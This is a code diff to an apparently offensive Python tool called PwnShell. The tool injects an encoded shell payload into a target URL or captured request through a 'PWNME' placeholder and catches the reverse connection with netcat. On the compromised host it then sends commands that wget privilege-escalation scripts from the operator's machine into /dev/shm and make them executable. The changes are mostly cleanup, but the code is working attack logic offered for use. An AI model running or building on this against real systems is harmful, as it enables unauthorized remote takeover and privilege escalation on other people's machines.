@@ -51,7 +51,7 @@ class PwnShell:
 
     def info(self):
     	self.payload_iter()
-    	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
+    	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request File':self.file, '[*]Use NodeJS Payloads':self.nodejs}
     	for key, value in info.items():
     		if value:
     			print(colors.get_colored_text(f"{key} : ", ColorsSet.ORANGE),end='')
@@ -94,7 +94,7 @@ class PwnShell:
         nc = nclib.Netcat(listen=('', self.port))
         print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
         print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
-        if self.method == "get":
+        if self.method == "get" or self.method == "GET":
         	print("[+]Vulnerable URL:",self.url)
         else:
         	print(f"[+]Payload: {self.encoded_payload}")
@@ -103,11 +103,11 @@ class PwnShell:
         print('[*]Cloning PrivESC Scripts From Their Repositories...')
         time.sleep(1)
         print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
-        os.system('curl -fs https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -fs https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+        os.system('curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
         print('[*]Activating a TTY Shell Using --> [Python3]')
         time.sleep(8)
         nc.send_line(b"export TERM=xterm-256color")
-        send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts ; clear '''
+        send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts -o .ignore; clear '''
         nc.send_line(send.encode("utf-8"))
         send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; clear ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null'''
         nc.send_line(send.encode("utf-8"))
@@ -172,10 +172,11 @@ class PwnShell:
         	if self.cookie:
         		cookies = self.cookie
         	else:
-        		cookies =None
+        		cookies = None
         	if self.method == 'post' or self.method == 'POST':
         		if self.data:
         			data_parsed = self.data.replace("PWNME", self.encoded_payload)  # Don't change
+        			r = requests.post(self.url, headers=headers,cookies=cookies, verify=False)
         		else:
         			data_parsed = None
         			r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
@@ -198,13 +199,17 @@ class PwnShell:
         			request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD
         		if r == "Host":
         			self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
-        	if post_data:
-        		self.url = self.url.replace("PWNME", self.encoded_payload)
-        		post_data = post_data.replace("PWNME", self.encoded_payload)
-        		req = requests.post(self.url, headers=request, data=post_data, verify=False)
+        	self.url = self.url.replace("PWNME", self.encoded_payload)
+
+        	if self.method == "post" or self.method == "POST":
+        		if post_data:
+        			post_data = post_data.replace("PWNME", self.encoded_payload)
+        			req = requests.post(self.url, headers=request, data=post_data, verify=False)
+        		else:
+        			req = requests.post(self.url, headers=request, verify=False)
+
         	else:
-        		self.url = self.url.replace("PWNME", self.encoded_payload)
-        		req = requests.get(self.url, headers=request,verify=False)
+        		req = requests.get(self.url, headers=request,proxies=proxies,verify=False)
         		time.sleep(2)
     ######################################################################################
     def payload_iter(self):
